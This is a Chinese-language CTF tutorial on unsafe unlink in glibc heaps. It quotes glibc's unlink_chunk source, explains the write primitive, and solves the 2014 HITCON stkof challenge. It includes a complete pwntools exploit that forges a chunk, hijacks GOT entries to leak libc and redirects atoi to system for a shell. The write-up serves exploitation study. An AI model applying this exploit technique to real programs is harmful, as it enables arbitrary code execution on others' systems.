# GLIBC 2.35中的Unlink

众所周知，glibc的堆管理器主要用链表结构维护chunk，特别的对于bins中双向链表的脱链操作叫做unlink。在老版本的glibc中，unlink被定义为一个宏，而新版本glibc中unlink被定义为一个函数。  
关于为什么会从宏变成函数，我个人猜测有两方面原因。一是函数有编译时检查，而宏没有；二是现代编译器对小函数的优化得很好了，可能直接类似宏展开，并不会有额外的函数调用开销。简言之，unlink的作用就是脱链，通常需要对双链表结构的bins取出时chunk时会调用unlink。  
除了及早期的unlink，现在glibc中的unlink通常有两个检查。一个是对size字段的检查，一个是对fd和bk指针的检查。对size字段的检查并不难处理，难的是fd和bk指针的检查使，为了绕过该检查使得unlink
attach的威力下降了一大截。

    
    
    /* Take a chunk off a bin list.  */
    static void
    unlink_chunk (mstate av, mchunkptr p)
    {
      if (chunksize (p) != prev_size (next_chunk (p)))
        malloc_printerr ("corrupted size vs. prev_size");
    
      mchunkptr fd = p->fd;
      mchunkptr bk = p->bk;
    
      if (__builtin_expect (fd->bk != p || bk->fd != p, 0))
        malloc_printerr ("corrupted double-linked list");
    
      fd->bk = bk;
      bk->fd = fd;
      if (!in_smallbin_range (chunksize_nomask (p)) && p->fd_nextsize != NULL)
        {
          if (p->fd_nextsize->bk_nextsize != p
    	  || p->bk_nextsize->fd_nextsize != p)
    	malloc_printerr ("corrupted double-linked list (not small)");
    
          if (fd->fd_nextsize == NULL)
    	{
    	  if (p->fd_nextsize == p)
    	    fd->fd_nextsize = fd->bk_nextsize = fd;
    	  else
    	    {
    	      fd->fd_nextsize = p->fd_nextsize;
    	      fd->bk_nextsize = p->bk_nextsize;
    	      p->fd_nextsize->bk_nextsize = fd;
    	      p->bk_nextsize->fd_nextsize = fd;
    	    }
    	}
          else
    	{
    	  p->fd_nextsize->bk_nextsize = p->bk_nextsize;
    	  p->bk_nextsize->fd_nextsize = p->fd_nextsize;
    	}
        }
    }
    

# 漫步unlink

通常 unsafe unlink都是向前合并，因此你需要找到如下图所示的内存布局或者构造出如下图所示的内存布局，你才能进行unsafe unlink。  
而现代unsafe
unlink已经不像曾经那么强大了，其最终结果是向`S`写入`S-3`，即`[S]=S-3`。但是许多讲unlink都在说可以任意地址写是怎么回事？我认为这个说法导致了很多人学习unlink很费劲，本质上unsfae
link并不能任意地址写，只能如我上句所说进行`[S]=S-3`的写入操作。那么如何才能任意地址写呢？  
想要unsafe
unlink的基础上进行任意地址写，需要劫持一个可以进行写操作的指针变量，因此若我们能够通过控制`S`指针从`S-3`开始往高地址覆写，直到劫持一个可以可控的进行写操作的指针为止，我们才算完成任意地址写，例如`S+1`是一个有写操作的指针，那么我们覆盖到`S+1`劫持该指针就能任意地址写了。  
![image](https://image.3001.net/images/20230516/1684198021_6462d2855c7ac8954bbce.png!small)

    
    
    static void
    unlink_chunk (mstate av, mchunkptr p)
    {
      if (chunksize (p) != prev_size (next_chunk (p)))
        malloc_printerr ("corrupted size vs. prev_size");
    
      mchunkptr fd = p->fd;
      mchunkptr bk = p->bk;
    
      if (__builtin_expect (fd->bk != p || bk->fd != p, 0))
        malloc_printerr ("corrupted double-linked list");
    
      fd->bk = bk;
      bk->fd = fd;
    // .... code
    // .... code
    }
    

>
> 注：实际上深入理解unlink你会发现我给出的两个chunk的内存布局只是最常规的，实际上只要可以通过unlink的检查，令unlink操作实现我们想要的写操作即可。但是刚学新知识，我觉得有必要从最规范的学起，屏蔽不必要的负担最快的入门，等自己实践多了自然而然会在规范的范式基础上延申、理解和学习，这样是最快、最顺畅的路径。

# 例子：2014 HITCON stkof

## 0x00 基本信息

题目信息，用的是2.23的libc

    
    
    cxing@DESKTOP-9LDRI50:/mnt/c/Users/admin/Desktop/PWN/unlink$ checksec stkof
    [*] '/mnt/c/Users/admin/Desktop/PWN/unlink/stkof'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      No PIE (0x3fe000)
    
    cxing@DESKTOP-9LDRI50:/mnt/c/Users/admin/Desktop/PWN/unlink$ ldd stkof
            linux-vdso.so.1 (0x00007fff36dfb000)
            /home/cxing/glibc-all-in-one-master/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so (0x00007fb5fa200000)
            /home/cxing/glibc-all-in-one-master/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so => /lib64/ld-linux-x86-64.so.2 (0x00007fb5fa6eb000)
    

菜单题目，但是没有菜单提示，有四个函数。分别是new，edit，delete，show。  
new函数可以malloc一块内存，并且将malloc的堆指针加入list指针数组中。`list[++index] =
v2;`需要注意的是由于使用前置`++index`，因此索引是从1开始的而非0。  
edit函数可以选择一个堆块，写入内容，并且写入内存的长度用户自定义，显然这里存在堆溢出。

    
    
    __int64 __fastcall main(int a1, char **a2, char **a3)
    {
      int v3; // eax
      int v5; // [rsp+Ch] [rbp-74h]
      char nptr[104]; // [rsp+10h] [rbp-70h] BYREF
      unsigned __int64 v7; // [rsp+78h] [rbp-8h]
    
      v7 = __readfsqword(0x28u);
      alarm(120u);
      while ( fgets(nptr, 10, stdin) )
      {
        v3 = atoi(nptr);
        if ( v3 == 2 )
        {
          v5 = edit();                              // heap overflow
          goto LABEL_14;
        }
        if ( v3 > 2 )
        {
          if ( v3 == 3 )
          {
            v5 = delete();
            goto LABEL_14;
          }
          if ( v3 == 4 )
          {
            v5 = show();
            goto LABEL_14;
          }
        }
        else if ( v3 == 1 )
        {
          v5 = new();
          goto LABEL_14;
        }
        v5 = -1;
    LABEL_14:
        if ( v5 )
          puts("FAIL");
        else
          puts("OK");
        fflush(stdout);
      }
      return 0LL;
    }
    

这是new函数可以malloc堆块。由于`list[++index] = v2;`，需要注意的是由于使用前置`++index`，因此索引是从1开始的而非0。

    
    
    __int64 add()
    {
      __int64 size; // [rsp+0h] [rbp-80h]
      char *v2; // [rsp+8h] [rbp-78h]
      char s[104]; // [rsp+10h] [rbp-70h] BYREF
      unsigned __int64 v4; // [rsp+78h] [rbp-8h]
    
      v4 = __readfsqword(0x28u);
      fgets(s, 16, stdin);
      size = atoll(s);
      v2 = (char *)malloc(size);
      if ( !v2 )
        return 0xFFFFFFFFLL;
      list[++index] = v2;
      printf("%d\n", (unsigned int)index);
      return 0LL;
    }
    

这是edit函数，可以往堆块写数据，但写入数据打长度没有限制，故而存在越界写，将导致堆溢出。

    
    
    __int64 edit()
    {
      int i; // eax
      unsigned int v2; // [rsp+8h] [rbp-88h]
      __int64 n; // [rsp+10h] [rbp-80h]
      char *ptr; // [rsp+18h] [rbp-78h]
      char s[104]; // [rsp+20h] [rbp-70h] BYREF
      unsigned __int64 v6; // [rsp+88h] [rbp-8h]
    
      v6 = __readfsqword(0x28u);
      fgets(s, 16, stdin);
      v2 = atol(s);
      if ( v2 > 0x100000 )
        return 0xFFFFFFFFLL;
      if ( !list[v2] )
        return 0xFFFFFFFFLL;
      fgets(s, 16, stdin);
      n = atoll(s);
      ptr = list[v2];
      for ( i = fread(ptr, 1uLL, n, stdin); i > 0; i = fread(ptr, 1uLL, n, stdin) )
      {
        ptr += i;
        n -= i;
      }
      if ( n )
        return 0xFFFFFFFFLL;
      else
        return 0LL;
    }
    

这时delete函数，没有什么问题。

    
    
    __int64 delete()
    {
      unsigned int v1; // [rsp+Ch] [rbp-74h]
      char s[104]; // [rsp+10h] [rbp-70h] BYREF
      unsigned __int64 v3; // [rsp+78h] [rbp-8h]
    
      v3 = __readfsqword(0x28u);
      fgets(s, 16, stdin);
      v1 = atol(s);
      if ( v1 > 0x100000 )
        return 0xFFFFFFFFLL;
      if ( !list[v1] )
        return 0xFFFFFFFFLL;
      free(list[v1]);
      list[v1] = 0LL;
      return 0LL;
    }
    

这时show函数，但并未打印任何有效信息。

    
    
    __int64 sub_400BA9()
    {
      unsigned int v1; // [rsp+Ch] [rbp-74h]
      char s[104]; // [rsp+10h] [rbp-70h] BYREF
      unsigned __int64 v3; // [rsp+78h] [rbp-8h]
    
      v3 = __readfsqword(0x28u);
      fgets(s, 16, stdin);
      v1 = atol(s);
      if ( v1 > 0x100000 )
        return 0xFFFFFFFFLL;
      if ( !list[v1] )
        return 0xFFFFFFFFLL;
      if ( strlen(list[v1]) <= 3 )
        puts("//TODO");
      else
        puts("...");
      return 0LL;
    }
    

## 0x01 漏洞利用

我们注意到edit中存在越界写，导致堆溢出，但是如何利用？理所应当的，为了控制程序流，我们通常需要劫持指针，然而程序本身的堆块布局并没有而是一个字符串空间。  
由于list这个指针数组存储了堆的指针，我们可以通过edit对list的指针进行写，显然我们可以先布局chunk的内存，然后进行unlink，这样lis指针数组中unlink后的指针将指向自身低0x18的位置，我们再往这个指针写数据，即可覆盖list数组，劫持list数组中的元素，这些原生将会被视作指针，并且可以进行写操作。如此，我们就实现了任意地址写。  
自然而然，由于是Partial
RELRO，我们希望通过任意地址写，劫持got表的指针进行getshell，在这之前我们需要泄露libc，也可以通过读got表实现，不过show函数并没有提供leak功能，因此我们需要改造一下show函数。  
具体的show函数每次都会`strlen(list[v2])`，我们可以通过任意地址写，把strlen@got的值改为put、printf这样的io函数，当然再delete中同样存在`free(list[v2])`可以改造成leak。

    
    
    from pwn import *
    
    context(arch='amd64', os='linux')
    context.log_level = 'debug'
    context.terminal = ['tmux', 'sp', '-h']
    
    elf = ELF("./stkof")
    io = process('./stkof')
    
    def malloc(size:int):
        io.send(b'1\n')
        io.send(str(size).encode() + b'\n')
        io.recvuntil("OK\n")
    
    
    
    def edit(index:int, data:bytes):
        io.send(b'2\n')
        io.send(str(index).encode() + b'\n')
        io.send(str(data.__len__()).encode() + b'\n')
        io.send(data)
        io.recvuntil("OK\n")
    
    
    def delete(index:int):
        io.send(b'3\n')
        io.send(str(index).encode() + b'\n')
    
    
    
    # unlink 实现任意地址写
    malloc(0x10) # 1
    malloc(0x10) # 2
    malloc(0x10) # 3
    malloc(0x30) # 4
    malloc(0x80) # 5
    malloc(0x10) # 6 
    
    unlink_chunk_ptr = 0x602140 + 0x20
    unlink_fd = unlink_chunk_ptr - 0x18
    unlink_bk = unlink_chunk_ptr - 0x10
    payload = b''
    payload += p64(0) + p64(0x31)
    payload += p64(unlink_fd) + p64(unlink_bk)
    payload += p64(0) + p64(0)
    payload += p64(0x30) + p64(0x90)
    # gdb.attach(io)
    edit(4, payload)
    delete(5)
    arbitrary_write = lambda addr,data: (edit(4, p64(addr)), edit(1, data))
    # 构造leak 写free got为 printf 或 puts 函数
    arbitrary_write(elf.got['free'], p64(elf.plt['puts']))
    edit(4, p64(elf.got['puts']))
    delete(1)
    
    io.recvline()
    libc_base = u64(io.recv(6).ljust(8, b'\x00')) - elf.libc.sym['puts']
    system_addr = libc_base + elf.libc.sym['system']
    print(f"[+] libc_base = {hex(libc_base)}")
    
    # 写atoi got为system函数
    arbitrary_write(elf.got['atoi'], p64(system_addr))
    
    io.interactive()
    

